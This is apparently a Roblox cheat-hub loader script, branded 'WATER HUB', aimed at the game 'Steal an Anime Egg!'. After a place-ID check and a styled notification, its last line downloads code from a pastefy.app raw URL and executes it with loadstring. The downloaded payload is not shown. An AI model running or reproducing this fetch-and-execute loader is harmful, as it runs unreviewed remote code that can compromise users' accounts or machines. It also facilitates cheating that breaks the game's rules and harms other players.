local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer

local AllowedPlaceId = 76377501906469

local function Notify(title, message, duration)
    local Gui = Instance.new("ScreenGui")
    Gui.Name = "WATER_HUB_NOTIFICATION"
    Gui.ResetOnSpawn = false
    Gui.IgnoreGuiInset = true
    Gui.Parent = Player:WaitForChild("PlayerGui")

    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 320, 0, 82)
    Main.Position = UDim2.new(1, 30, 0, 35)
    Main.BackgroundColor3 = Color3.fromRGB(8, 12, 20)
    Main.BackgroundTransparency = 0.05
    Main.BorderSizePixel = 0
    Main.Parent = Gui

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 16)
    Corner.Parent = Main

    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(0, 210, 255)
    Stroke.Thickness = 1.5
    Stroke.Transparency = 0.15
    Stroke.Parent = Main

    local Glow = Instance.new("ImageLabel")
    Glow.BackgroundTransparency = 1
    Glow.Position = UDim2.new(0, -15, 0, -15)
    Glow.Size = UDim2.new(1, 30, 1, 30)
    Glow.Image = "rbxassetid://5028857084"
    Glow.ImageColor3 = Color3.fromRGB(0, 190, 255)
    Glow.ImageTransparency = 0.8
    Glow.ScaleType = Enum.ScaleType.Slice
    Glow.SliceCenter = Rect.new(24, 24, 276, 276)
    Glow.ZIndex = 0
    Glow.Parent = Main

    local Title = Instance.new("TextLabel")
    Title.BackgroundTransparency = 1
    Title.Position = UDim2.new(0, 18, 0, 9)
    Title.Size = UDim2.new(1, -30, 0, 27)
    Title.Font = Enum.Font.GothamBold
    Title.Text = "WATER HUB  •  " .. title
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 17
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.ZIndex = 2
    Title.Parent = Main

    local Message = Instance.new("TextLabel")
    Message.BackgroundTransparency = 1
    Message.Position = UDim2.new(0, 18, 0, 39)
    Message.Size = UDim2.new(1, -30, 0, 25)
    Message.Font = Enum.Font.Gotham
    Message.Text = message
    Message.TextColor3 = Color3.fromRGB(80, 220, 255)
    Message.TextSize = 14
    Message.TextXAlignment = Enum.TextXAlignment.Left
    Message.ZIndex = 2
    Message.Parent = Main

    TweenService:Create(
        Main,
        TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {Position = UDim2.new(1, -340, 0, 35)}
    ):Play()

    task.wait(duration or 3)

    local Out = TweenService:Create(
        Main,
        TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
        {Position = UDim2.new(1, 30, 0, 35)}
    )

    Out:Play()
    Out.Completed:Wait()

    Gui:Destroy()
end

if game.PlaceId ~= AllowedPlaceId then
    Player:Kick("WATER HUB\nThis game is not supported.")
    return
end

Notify("Success ✓", "Steal an Anime Egg! detected", 3)

task.wait(0.6)

loadstring(game:HttpGet("https://pastefy.app/zpDZlsNt/raw"))()
